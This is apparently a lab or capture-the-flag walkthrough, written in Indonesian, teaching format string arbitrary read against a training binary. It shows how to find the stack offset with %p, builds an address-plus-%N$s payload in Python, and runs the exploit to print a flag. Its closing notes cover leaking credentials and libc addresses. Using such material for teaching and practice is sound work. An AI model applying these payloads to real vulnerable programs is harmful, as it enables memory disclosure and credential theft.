# Walkthrough: Level 1 - Arbitrary Read
**Author**: Kenshin Himura

## Objective
Membaca string `secret` dari memory menggunakan format specifier `%s`.

## Konsep Dasar

**Arbitrary Read via `%s`**:
- `%s` membaca data dari **address** yang ada di stack
- Jika kita taruh address `secret` di payload kita, dan payload kita ada di stack...
- Maka `%{offset}$s` akan membaca address tersebut dan print string di lokasinya

```
Stack layout:
  [esp+0x00]  ...stack values...
  [esp+0xXX]  0x0804a040  ← address secret (dari payload kita!)
  ...
  
Format: [address_secret] + %{offset}$s
               ↓
         printf baca address dari stack
               ↓
         dereference -> print string di address tersebut
```

## Step-by-Step

### 1. Compile
```bash
make level1
```

### 2. Dapatkan address secret
Program mencetak address secret:
```
secret @ 0xXXXXXXXX
```

### 3. Temukan offset
```bash
$ echo 'AAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p' | ./format1
```
Cari `0x41414141` di output -> dapatkan offset N.

### 4. Craft payload
```
[address_secret 4 bytes] + %{N}$s
```

Address harus dalam format **little-endian**. Contoh jika secret @ `0x0804a060`:
```
\x60\xa0\x04\x08
```

### 5. Contoh payload
```python
# Python untuk generate payload:
import struct
secret_addr = 0x0804a060
offset = 7  # ganti dengan offset yang kamu temukan
payload = struct.pack('<I', secret_addr) + f'%{offset}$s'.encode()
print(payload)
```

### 6. Exploit
```bash
$ python3 -c "
import struct
addr = struct.pack('<I', 0x0804a060)
payload = addr + b'%7\$s'
print(payload.decode('latin-1'))
" | ./format1
```

Output:
```
You entered: `��%7$s
FLAG{format_string_arbitrary_read_pwned!}
```

### 7. Debug dengan GDB
```bash
$ gdb ./format1
(gdb) x/s 0x0804a060
# verifikasi string secret tersimpan di address tersebut
(gdb) b printf
(gdb) r
# inspect stack untuk lihat address kita
```

## Takeaways
- `%s` + address di stack = arbitrary read
- Dapat membaca GOT entry, environment variable, credential di memory
- Sebelum write exploit, leak dulu - leakage ini dipakai untuk menghitung libc base dan address target
- `%n$p` loop untuk enumerasi seluruh stack space

## Automation Script
```bash
python3 exploit1.py
```
